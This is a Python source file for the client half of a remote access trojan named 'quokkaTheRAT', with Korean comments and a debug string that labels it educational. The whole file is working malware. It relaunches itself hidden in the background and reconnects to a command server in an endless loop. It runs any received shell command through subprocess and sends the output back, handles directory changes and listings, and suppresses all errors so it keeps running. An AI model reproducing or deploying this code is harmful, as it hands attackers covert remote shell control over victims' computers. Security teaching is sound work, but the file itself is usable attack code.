# quokkaTheRAT_client.py
import os,socket,subprocess
import time,sys
import win32com.shell.shell as shell

DEBUG=False
BACKGROUND=True
port = 8080  # 서버의 포트 번호 
host_addr = "localhost" # 서버의 IP주소 

# 디버깅 메시지 출력 함수 
def debug_print(str):
    if(DEBUG):
        print(str)

# 디버깅 중지 함수 
def debug_pause():
    if(DEBUG):
        os.system('pause')

# 메시지를 서버에 전송하고 응답을 받는 함수 
def send_and_recv(conn_param,message): # socket send safe function. if send empty buffer, server cannot get. so should be altered
    BUFFER_SIZE=10000
    if(message==''):
        print("null message error...") #빈 패킷을 보내지않도록 처리
        return 0
    conn_param.send(message.encode())
    print("wait for host message...")
    recved = conn_param.recv(BUFFER_SIZE).decode()
    print(recved)
    return recved

# 메시지를 안전하게 서버에 전송하는 함수 
def send_s(conn_param,message): # safe send socket. restrict null message
    BUFFER_SIZE=10000
    if(message==''):
        print("null message error...") #빈 패킷을 보내지않도록 처리
        return 0
    try:
        conn_param.send(message.encode('utf-8'))
    except Exception as e:
        debug_print(e)
        conn_param.send(message.encode('cp949'))

# 백그라운드에서 프로그램을 실행
if(BACKGROUND):
    if sys.argv[-1] != 'child':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([script]+sys.argv[1:]+['child'])
        shell.ShellExecuteEx(lpFile=sys.executable,lpParameters=params)
        sys.exit(0)


debug_print("hello debug!")

#### payload
debug_print("WIN QUOKKA RAT PAYLOAD EDUCARTION start...")
while True:
    try:
        # 서버에 연결 시도 
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.connect((host_addr, port))
            debug_print(f"connected to {host_addr},{port}")
            # 소켓 연결 루프 
            while True:
                # recv server command
                debug_print("wait for server message...")
                server_cmd = conn.recv(10000).decode()
                debug_print(f"command recv success!! : {server_cmd}") #recv success
                # if recved command, if command is special, handle wheather its special command
                # 특수 명령어에 따른 처리 
                if(server_cmd[:2]=="cd"): # cd makes shell change... so it required to handled as special command
                    os.chdir(str(server_cmd[3:]))
                    output=os.getcwd()
                    send_s(conn,output)
                elif(server_cmd[:2]=="ls"): # alter mojibake hangul
                    dir_list=os.listdir(os.getcwd())
                    send_s(conn,'\n'.join(dir_list))
                elif(server_cmd[:4]=="term"):
                    os._exit(0)
                else:
                    # 일반적인 쉘 명령어 처리 
                    output=subprocess.getoutput(server_cmd)
                    debug_print(f"output: /{output}/")
                    send_s(conn,output) # send terminal output to server
                    debug_print("output sended to server...")
            ## Socket Connected loop end ##
    # try to connect to host // failed, infinite loop
    except Exception as e:
        debug_print(e)
        pass #네트워크 에러면 재시도하고, 다른 모든 에러는 모두 pass해서 절대 꺼지지않도록 함.